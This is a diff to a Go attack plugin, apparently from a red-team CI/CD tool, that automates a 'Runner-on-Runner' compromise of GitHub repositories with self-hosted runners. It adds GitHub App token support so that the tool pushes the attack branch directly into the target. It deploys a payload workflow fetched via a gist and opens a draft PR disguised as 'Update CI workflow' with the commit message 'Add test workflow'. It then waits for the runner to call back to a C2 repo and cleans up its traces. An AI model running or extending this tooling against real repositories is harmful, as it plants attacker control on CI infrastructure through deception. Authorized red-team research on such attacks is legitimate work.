@@ -82,6 +82,14 @@ func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*atta
 	runnerLabels := getOrDefault(opts.ExtraOpts, "runner_labels", "self-hosted")
 	keepAlive := opts.ExtraOpts["keep_alive"] == "true"
 
+	// Fail fast: app tokens have no user namespace, require explicit C2 repo
+	isApp := client.IsGitHubAppToken()
+	if isApp && c2Repo == "" {
+		result.Success = false
+		result.Message = "installation token requires an explicit C2 repo: pass --c2-repo <owner>/<repo> (GitHub App tokens have no user namespace and cannot create one)"
+		return result, fmt.Errorf("missing --c2-repo for installation token")
+	}
+
 	// Validate target repository uses self-hosted runners
 	hasSelfHosted, err := checkForSelfHostedRunners(ctx, client, owner, repo)
 	if err != nil {
@@ -139,101 +147,83 @@ func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*atta
 		URL:         gistURL,
 	})
 
-	// Step 3: Fork target repository
-	fork, err := client.ForkRepository(ctx, owner, repo)
-	if err != nil {
-		result.Success = false
-		result.Message = fmt.Sprintf("failed to fork repository: %v", err)
-		return result, err
+	// Step 3-6: Token-aware delivery — app tokens push directly into target; user tokens fork.
+	var headOwner, headRepo, prHead string
+	branchName := fmt.Sprintf("trajan-ror-%s", opts.SessionID)
+
+	if isApp {
+		headOwner, headRepo = owner, repo
+		prHead = branchName // same-repo head
+	} else {
+		fork, err := client.ForkRepository(ctx, owner, repo)
+		if err != nil {
+			result.Success = false
+			result.Message = fmt.Sprintf("failed to fork repository: %v", err)
+			return result, err
+		}
+		result.Artifacts = append(result.Artifacts, attacks.Artifact{
+			Type: attacks.ArtifactRepository, Identifier: fork.FullName,
+			Description: "Forked repository", URL: fork.HTMLURL,
+		})
+		time.Sleep(5 * time.Second)
+		headOwner, headRepo = fork.Owner.Login, fork.Name
+		prHead = fmt.Sprintf("%s:%s", fork.Owner.Login, branchName)
 	}
 
-	result.Artifacts = append(result.Artifacts, attacks.Artifact{
-		Type:        attacks.ArtifactRepository,
-		Identifier:  fork.FullName,
-		Description: "Forked repository",
-		URL:         fork.HTMLURL,
-	})
-
-	// Wait for fork to be ready
-	time.Sleep(5 * time.Second)
-
-	// Step 4: Create attack branch in fork
-	branchName := fmt.Sprintf("trajan-ror-%s", opts.SessionID)
-	defaultBranch, err := common.GetDefaultBranch(ctx, client, fork.Owner.Login, fork.Name)
+	defaultBranch, err := common.GetDefaultBranch(ctx, client, headOwner, headRepo)
 	if err != nil {
 		result.Success = false
 		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
 		return result, err
 	}
-	branchSHA, err := common.GetBranchSHA(ctx, client, fork.Owner.Login, fork.Name, defaultBranch)
+	branchSHA, err := common.GetBranchSHA(ctx, client, headOwner, headRepo, defaultBranch)
 	if err != nil {
 		result.Success = false
 		result.Message = fmt.Sprintf("failed to get branch SHA: %v", err)
 		return result, err
 	}
-
-	_, err = client.CreateBranch(ctx, fork.Owner.Login, fork.Name, branchName, branchSHA)
-	if err != nil {
+	if _, err = client.CreateBranch(ctx, headOwner, headRepo, branchName, branchSHA); err != nil {
 		result.Success = false
-		result.Message = fmt.Sprintf("failed to create branch: %v", err)
+		result.Message = fmt.Sprintf("failed to create branch (installation may lack Contents:write): %v", err)
 		return result, err
 	}
-
 	result.Artifacts = append(result.Artifacts, attacks.Artifact{
-		Type:        attacks.ArtifactBranch,
-		Identifier:  branchName,
-		Description: "Attack branch in fork",
+		Type: attacks.ArtifactBranch, Identifier: branchName, Description: "Attack branch",
 	})
 
-	// Step 5: Deploy RoR workflow to fork
 	rorWorkflow := common.RoRWorkflowPayload(gistURL, runnerLabels, targetOS)
 	workflowPath := ".github/workflows/trajan-ror.yml"
-	_, err = client.CreateOrUpdateFile(ctx, fork.Owner.Login, fork.Name, workflowPath,
-		github.FileContentInput{
-			Message: "Add test workflow",
-			Content: common.EncodeBase64(rorWorkflow),
-			Branch:  branchName,
-		})
-	if err != nil {
+	if _, err = client.CreateOrUpdateFile(ctx, headOwner, headRepo, workflowPath,
+		github.FileContentInput{Message: "Add test workflow", Content: common.EncodeBase64(rorWorkflow), Branch: branchName}); err != nil {
 		result.Success = false
-		result.Message = fmt.Sprintf("failed to deploy workflow: %v", err)
+		result.Message = fmt.Sprintf("failed to deploy workflow (installation may lack Contents:write): %v", err)
 		return result, err
 	}
-
 	result.Artifacts = append(result.Artifacts, attacks.Artifact{
-		Type:        attacks.ArtifactWorkflow,
-		Identifier:  workflowPath,
-		Description: "RoR workflow deployed",
-		URL:         fmt.Sprintf("%s/blob/%s/%s", fork.HTMLURL, branchName, workflowPath),
+		Type: attacks.ArtifactWorkflow, Identifier: workflowPath, Description: "RoR workflow deployed",
 	})
 
-	// Step 6: Create pull request to target
 	pr, err := client.CreatePullRequest(ctx, owner, repo, github.PullRequestInput{
-		Title: "Update CI workflow",
-		Body:  "CI improvements",
-		Head:  fmt.Sprintf("%s:%s", fork.Owner.Login, branchName),
-		Base:  defaultBranch,
-		Draft: true,
+		Title: "Update CI workflow", Body: "CI improvements", Head: prHead, Base: defaultBranch, Draft: true,
 	})
 	if err != nil {
 		result.Success = false
-		result.Message = fmt.Sprintf("failed to create PR: %v", err)
+		result.Message = fmt.Sprintf("failed to create PR (installation may lack Pull-requests:write): %v", err)
 		return result, err
 	}
-
 	result.Artifacts = append(result.Artifacts, attacks.Artifact{
-		Type:        attacks.ArtifactPR,
-		Identifier:  fmt.Sprintf("%d", pr.Number),
-		URL:         pr.HTMLURL,
-		Description: "Attack PR created",
+		Type: attacks.ArtifactPR, Identifier: fmt.Sprintf("%d", pr.Number), URL: pr.HTMLURL, Description: "Attack PR created",
 	})
 
 	// Step 7: Parse C2 repo owner/name
 	c2Parts := strings.Split(c2Repo, "/")
 	var c2Owner, c2RepoName string
 	if len(c2Parts) == 2 {
-		c2Owner = c2Parts[0]
-		c2RepoName = c2Parts[1]
+		c2Owner, c2RepoName = c2Parts[0], c2Parts[1]
+	} else if isApp {
+		result.Success = false
+		result.Message = "installation token requires --c2-repo in owner/repo form"
+		return result, fmt.Errorf("invalid --c2-repo for installation token")
 	} else {
 		// Get authenticated user
 		user, err := client.GetUser(ctx)
@@ -242,8 +232,7 @@ func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*atta
 			result.Message = fmt.Sprintf("failed to get authenticated user: %v", err)
 			return result, err
 		}
-		c2Owner = user.Login
-		c2RepoName = c2Repo
+		c2Owner, c2RepoName = user.Login, c2Repo
 	}
 
 	// Step 8: Poll for runner connection
@@ -256,18 +245,13 @@ func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*atta
 
 	// Step 9: Cleanup gist after successful implant
 	cleanupActions := []attacks.CleanupAction{
-		{
-			Type:        attacks.ArtifactPR,
-			Identifier:  fmt.Sprintf("%d", pr.Number),
-			Action:      "close",
-			Description: "Close attack PR",
-		},
-		{
-			Type:        attacks.ArtifactRepository,
-			Identifier:  fork.FullName,
-			Action:      "delete",
-			Description: "Delete fork",
-		},
+		{Type: attacks.ArtifactPR, Identifier: fmt.Sprintf("%d", pr.Number), Action: "close", Description: "Close attack PR"},
+	}
+	if !isApp {
+		cleanupActions = append(cleanupActions, attacks.CleanupAction{
+			Type: attacks.ArtifactRepository, Identifier: fmt.Sprintf("%s/%s", headOwner, headRepo),
+			Action: "delete", Description: "Delete fork",
+		})
 	}
 
 	// Only cleanup C2 repo if we created it
